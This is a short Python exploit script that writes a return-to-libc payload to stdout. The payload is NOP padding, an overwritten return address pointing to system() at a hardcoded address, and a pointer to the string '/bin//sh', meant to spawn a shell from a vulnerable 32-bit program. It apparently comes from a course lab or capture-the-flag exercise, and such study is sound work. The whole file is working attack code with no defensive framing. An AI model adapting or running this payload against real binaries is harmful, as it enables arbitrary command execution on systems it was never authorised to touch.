#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

'''https://stackoverflow.com/questions/43294227/hijacking-system-bin-sh-to-run-arbitrary-commands'''

VULNERABLE_EBP = 0xfffed298     # vulnerable %ebp
ADDR_DIFF = 0x12                # %ebp - buf start address      (18-byte)
VULNERABLE_FP_SIZE = 0x04       # vulnerable frame pointer size (4-byte)
VULNERABLE_RET_ADDR_SIZE = 0x04 # vulnerable ret addr size      (4-byte)
SYSTEM_ADDR = 0x804fc20         # system() call address
PADDING = 0x04                  # padding for system()          (4-byte)
BIN_SH_PTR_SIZE = 0x04          # ptr to 'bin//sh'              (4-byte)
# '/bin//sh' address
BIN_SH_ADDR = VULNERABLE_EBP+VULNERABLE_FP_SIZE+VULNERABLE_RET_ADDR_SIZE+PADDING+BIN_SH_PTR_SIZE
BIN_SH = b'/bin//sh'            # '/bin//sh' in byte

sys.stdout.buffer.write(b'\x90'*(ADDR_DIFF+VULNERABLE_FP_SIZE)+pack('<I',SYSTEM_ADDR)+b'\x90'*PADDING+pack('<I',BIN_SH_ADDR)+BIN_SH)